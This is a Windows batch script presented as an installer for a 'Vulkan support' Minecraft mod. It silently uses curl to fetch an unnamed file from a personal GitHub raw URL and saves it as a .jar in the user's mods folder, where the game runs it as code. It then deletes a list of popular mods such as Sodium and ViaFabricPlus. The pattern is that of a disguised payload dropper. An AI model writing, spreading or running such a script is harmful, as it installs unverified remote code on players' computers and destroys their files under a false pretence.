@echo off
setlocal enabledelayedexpansion

:: Define the Minecraft mods directory
set "modsDir=%appdata%\.minecraft\mods"

:: Ensure the mods directory exists
if not exist "%modsDir%" (
    mkdir "%modsDir%"
    echo Created mods directory: %modsDir%
)

:: URL of the mod to download
set "modUrl=https://raw.githubusercontent.com/JoshBeCute/letssee/refs/heads/main/vulkansupportmods"

:: Sanitize the filename (vulkansupportmods)
set "filename=vulkansupportmods"

:: Initialize sanitized filename
set "sanitized="

:: Sanitize each character in the filename
for /l %%i in (0,1,31) do (
    set "char=!filename:~%%i,1!"
    if "!char!" neq "" (
        if "!char!" geq "a" if "!char!" leq "z" (
            set "sanitized=!sanitized!!char!"
        ) else if "!char!" geq "0" if "!char!" leq "9" (
            set "sanitized=!sanitized!!char!"
        )
    )
)

:: Ensure filename is not empty
if "!sanitized!"=="" (
    echo Error: Filename sanitization resulted in an empty name.
    pause
    exit /b 1
)

:: Append .jar extension for saving
set "finalFilename=!sanitized!.jar"

:: Check if the file already exists
if not exist "%modsDir%\!finalFilename!" (
    echo Downloading !finalFilename! from %modUrl%...
    curl -s -o "%modsDir%\!finalFilename!" "%modUrl%"
    if errorlevel 1 (
        echo Error downloading !finalFilename!.
    )
) else (
    echo !finalFilename! already exists.
)

:: Delete specified files at the end of the download process
echo.
echo Starting deletion process...

:: List of files to delete
set "filesToDelete=ImmediatelyFastFabricB enhancedblockentitiesB sodiumfabricbetaBmc fixantighostforkcrashj Palladiumx guardvillagersjar NetherChestedvFab ImprovedAnvilsjar gravesBjar ViaFabricPlusjar DeathFindervFabri advancednetheritefabric Terralithvjar TerraBlenderfabric"

:: Check for and delete specified files
for %%F in (%filesToDelete%) do (
    if exist "%modsDir%\%%F.jar" (
        echo Deleting %%F.jar...
        del "%modsDir%\%%F.jar"
    )
)

:: Clean up
echo Deletion and download process completed.
pause
endlocal
